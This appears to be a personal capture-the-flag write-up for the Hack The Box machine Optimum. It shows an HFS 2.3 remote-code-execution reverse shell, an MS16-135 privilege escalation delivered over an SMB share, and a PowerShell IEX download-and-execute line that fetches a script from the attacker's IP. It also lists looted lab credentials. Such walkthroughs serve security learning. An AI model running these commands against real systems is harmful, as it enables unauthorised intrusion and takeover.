
# Enumeration 

## open ports
```
80/tcp open  http    syn-ack HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
# Foothold 
we got HFS version
HttpFileServer httpd 2.3
![[Pasted image 20230129050935.png]]

the script from searchsploit isn't really working so going to search for github bone
[Rejetto RCE to rev shelll](https://raw.githubusercontent.com/NullByte007/Exploits/master/Rejetto_HFS_2.3.X_RCE/HFS_RCE.py)
`python3 HFS_RCE.py  -lh 10.10.16.5 -lp 9001 -rh $ip -rp 80 -hid 0.352156891487539`
![[Pasted image 20230129051946.png]]

# Privesc 
running winpeas
![[Pasted image 20230129052915.png]]

using windows-exploit-suggester.py 
first we copy output of systeminfo command
then we past it inside a file 

```
./windows-exploit-suggester.py --update # download database
./windows-exploit-suggester.py --database 2023-01-12-mssb.xls --systeminfo sysinfo 
```
![[Pasted image 20230129055611.png]]
using windows-kernel-exploits repo from github
[MS16-135](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/MS16-135.ps1)

start smb server and upload our exploit
```
smbserver.py share . -smb2support
copy \\10.10.16.5\share\ms16.ps1
```
![[Pasted image 20230129060001.png]]
using nishang reverse shell  and adding this line at the end![[Pasted image 20230129063821.png]]
`IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/inv.ps1')`
`[Environment]::Is64BitProcess`
![[Pasted image 20230129063917.png]]
![[Pasted image 20230129064037.png]]

# Loot
kostas creds:
	username: kostas
	password: kdeEjDowkS*


---
Tags: #ctf #htb #ms16-135
Resources: [Optimum](https://app.hackthebox.com/machines/6)